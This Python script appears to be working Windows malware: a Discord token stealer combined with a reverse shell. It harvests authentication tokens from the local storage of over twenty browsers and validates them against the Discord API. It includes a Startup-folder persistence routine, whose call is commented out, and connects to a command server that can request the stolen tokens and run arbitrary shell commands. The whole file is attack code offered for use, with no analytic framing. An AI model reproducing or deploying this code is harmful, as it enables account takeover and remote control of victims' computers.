import sys
import socket
import subprocess
import os
from os import listdir, getlogin
from re import findall
import getpass
from base64 import b64decode
import base64
from win32crypt import CryptUnprotectData
import re
import requests

USER_NAME = getpass.getuser()
print(USER_NAME)
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)

def extract2():
    paths = {
        'Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': LOCAL + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': LOCAL + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': LOCAL + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': LOCAL + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': LOCAL + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': LOCAL + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': LOCAL + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': LOCAL + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': LOCAL + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
    tokens = []
    uids = []
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                        if validate_token(token):
                            uid = requests.get("https://discord.com/api/v9/users/@me", headers={'Authorization': token}).json()['id']
                            if uid not in uids:
                                tokens.append(token)
                                uids.append(uid)
                            return [tokens, uids]
def validate_token(token) -> bool:
    r = requests.get("https://discord.com/api/v9/users/@me", headers={'Authorization': token})
    if r.status_code == 200:
        return True
    else:
        return False
#add_to_startup()
HOST = "127.0.0.1"
PORT = 9001
msg = ""

s = socket.socket()
for i in range(0,100):
    if i == 99:
        i = 0
    try:
        s.connect((HOST, PORT))
    except Exception:
        continue
    break
msg = s.recv(1024).decode("UTF-8")
print(f"[*] server: {msg}")
while True:
    cmd = s.recv(1024).decode("UTF-8")
    print(f"[!] received command: {cmd}")
    if cmd.lower() in ["token", "gettoken"]:
        extracted = extract2()
        token = extracted[0]
        token = token[0]
        print(token)
        print("")
        print(extracted[1])
        s.send(token.encode("UTF-8"))
    if cmd.lower() in ["quit", "exit", "bye", 'q']:
        break
    if cmd.lower() in ["cwd"]:
        result = os.getcwd().encode("UTF-8")
        s.send(result)
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode("UTF-8")
    
    if len(result) == 0:
        result = "[+] executed succesfully".encode("UTF-8")
    
    s.send(result)
s.close()